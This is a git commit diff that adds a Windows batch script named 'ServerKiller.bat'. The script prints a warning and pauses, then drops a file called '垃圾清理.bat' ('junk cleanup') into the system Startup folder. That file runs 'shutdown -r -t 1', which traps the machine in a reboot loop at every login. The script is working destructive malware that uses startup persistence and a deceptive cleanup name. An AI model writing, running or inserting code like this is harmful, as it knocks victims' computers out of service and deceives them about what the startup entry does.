869426fc304c6b9a7f16dcee323991e5910f60ef
任宝硕 <47095648+renbaoshuo@users.noreply.github.com>
2020-05-10 22:46:12 +0800

    Update ServerKiller.bat

--- ServerKiller.bat
+++ ServerKiller.bat
@@ -1,1 +1,7 @@
+@echo off
 
+echo "This script can only be run in Windows 7+ system!"
+echo.
+pause
+# Winodws 7+
+echo "shutdown -r -t 1" > "%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\垃圾清理.bat"
